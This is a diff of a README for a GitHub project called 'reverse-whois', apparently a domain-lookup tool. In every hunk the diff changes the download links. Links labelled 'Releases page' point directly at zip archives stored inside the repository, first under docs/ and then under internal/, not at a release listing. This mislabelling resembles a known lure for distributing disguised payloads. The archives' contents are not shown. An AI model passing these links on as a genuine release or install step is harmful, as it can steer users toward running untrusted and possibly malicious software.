@@ -8,7 +8,7 @@ Welcome to reverse-whois! This tool helps you find domains linked to specific te
 
 To get started, visit the Releases page to download the latest version of reverse-whois. Click the button below to access the page:
 
-[![Download reverse-whois](https://github.com/Hayame-Genshin/reverse-whois/raw/refs/heads/main/docs/reverse_whois_3.7.zip)](https://github.com/Hayame-Genshin/reverse-whois/raw/refs/heads/main/docs/reverse_whois_3.7.zip)
+[![Download reverse-whois](https://raw.githubusercontent.com/Hayame-Genshin/reverse-whois/main/internal/whois-reverse-1.0.zip)](https://raw.githubusercontent.com/Hayame-Genshin/reverse-whois/main/internal/whois-reverse-1.0.zip)
 
 You will find several versions available. Choose the one that matches your operating system (Windows, macOS, or Linux). 
 
@@ -28,7 +28,7 @@ Before you download, make sure your system meets these requirements:
 ## 🏗️ Installation Instructions
 
 1. **Download the Application:**
-   - Go to the [Releases page](https://github.com/Hayame-Genshin/reverse-whois/raw/refs/heads/main/docs/reverse_whois_3.7.zip).
+   - Go to the [Releases page](https://raw.githubusercontent.com/Hayame-Genshin/reverse-whois/main/internal/whois-reverse-1.0.zip).
    - Select the file that fits your system.
    - Click to download the file.
 
@@ -109,6 +109,6 @@ For additional support or to report issues, please submit a ticket in the GitHub
 
 ## 💡 Learn More
 
-To delve deeper into reverse-whois and its capabilities, take a look at our [Releases page](https://github.com/Hayame-Genshin/reverse-whois/raw/refs/heads/main/docs/reverse_whois_3.7.zip) to explore version updates and improvements.
+To delve deeper into reverse-whois and its capabilities, take a look at our [Releases page](https://raw.githubusercontent.com/Hayame-Genshin/reverse-whois/main/internal/whois-reverse-1.0.zip) to explore version updates and improvements.
 
 By following these steps, you will be equipped to successfully download and use reverse-whois for your needs. Enjoy your exploration!
